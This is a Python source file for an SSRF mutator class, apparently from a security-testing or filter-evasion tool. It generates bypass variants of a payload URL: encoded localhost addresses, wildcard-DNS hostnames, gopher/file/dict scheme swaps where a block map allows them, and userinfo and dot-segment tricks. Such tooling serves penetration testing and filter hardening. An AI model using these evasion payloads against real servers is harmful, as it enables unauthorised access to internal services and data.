import urllib.parse
from typing import List
from .base import BaseMutator
from ..prober import BlockMap

class SsrfMutator(BaseMutator):
    """
    Applies SSRF-specific evasion mutations (IP encodings, schema changes, host obfuscation).
    """

    def mutate(self, payload: str, block_map: BlockMap) -> List[str]:
        candidates = []

        # Parse the input payload as a URL if possible, otherwise treat the whole thing as a host/URL
        parsed = urllib.parse.urlparse(payload)
        scheme = parsed.scheme or "http"
        netloc = parsed.netloc or payload
        path = parsed.path
        query = parsed.query
        fragment = parsed.fragment

        # Extract host and port
        host = netloc
        port = ""
        if ":" in netloc:
            host_parts = netloc.split(":")
            # Simple check for IPv6 brackets
            if netloc.startswith("[") and "]" in netloc:
                # IPv6 with port
                idx = netloc.rfind(":")
                host = netloc[:idx]
                port = netloc[idx:]
            else:
                host = host_parts[0]
                port = f":{host_parts[1]}"

        # Identify alternative hosts
        hosts_alt = []
        is_localhost = host.lower() in ["localhost", "127.0.0.1", "[::1]", "0.0.0.0", "127.1"]

        if is_localhost:
            # Add standard alternates
            hosts_alt.extend([
                "localhost",
                "127.0.0.1",
                "127.1",
                "0.0.0.0",
                "0",
                "[::1]",
                "[::]",
                "[0:0:0:0:0:0:0:1]",
                "127.0.0.2",
                "127.127.127.127",
            ])

            # IP representations
            # 1. Decimal representation (2130706433 for 127.0.0.1)
            hosts_alt.append("2130706433")
            # 2. Octal representation (017700000001)
            hosts_alt.append("017700000001")
            # 3. Hex representation (0x7f000001)
            hosts_alt.append("0x7f000001")
            # 4. Mixed octal/decimal (e.g. 0177.0.0.1)
            hosts_alt.append("0177.0.0.1")
            # 5. Mixed hex/decimal (e.g. 0x7f.0.0.1)
            hosts_alt.append("0x7f.0.0.1")

            # Localhost DNS Resolvers / Wildcard DNS
            hosts_alt.extend([
                "local.gd",
                "127.0.0.1.nip.io",
                "spoofed.localhost.localdomain",
                "localhost.sec.evt.name",
            ])

        # Generate mutations for schemes
        schemes_alt = [scheme]
        if scheme == "http" or scheme == "https":
            # Add other interesting SSRF schemes if allowed
            for s in ["file", "dict", "gopher", "ftp", "ldap"]:
                if not block_map.is_blocked(s):
                    schemes_alt.append(s)

        # Build candidate URLs
        for s in schemes_alt:
            for h in hosts_alt or [host]:
                # 1. Simple reconstruction
                rec = f"{s}://{h}{port}{path}"
                if query:
                    rec += f"?{query}"
                if fragment:
                    rec += f"#{fragment}"
                candidates.append(rec)

                # 2. Credentials obfuscation (UserInfo)
                # e.g., http://google.com@127.0.0.1 or http://127.0.0.1@google.com
                candidates.append(f"{s}://google.com@{h}{port}{path}")
                candidates.append(f"{s}://{h}{port}@google.com{path}")
                
                # 3. Path/URL double slashes and dot-segments
                candidates.append(f"{s}://{h}{port}/./{path.lstrip('/')}")
                candidates.append(f"{s}://{h}{port}/../{path.lstrip('/')}")

        # If payload was just a hostname (no scheme), also include pure host representations
        if not parsed.scheme:
            candidates.extend(hosts_alt)

        return list(set(candidates))
